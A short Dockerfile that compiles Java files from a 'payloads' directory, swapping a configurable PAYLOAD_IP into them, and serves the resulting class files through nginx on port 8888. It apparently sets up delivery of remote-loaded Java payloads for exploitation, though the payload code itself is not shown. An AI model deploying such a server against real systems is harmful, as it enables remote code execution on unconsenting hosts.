FROM openjdk:8-alpine as builder

ARG PAYLOAD_IP=127.0.0.1

ADD payloads payloads
WORKDIR /payloads
RUN for f in *.java ; do sed -i -e "s/127.0.0.1/${PAYLOAD_IP}/" "$f"; javac "$f" ; done

FROM nginx
COPY --from=builder /payloads/*.class /tmp/

EXPOSE 8888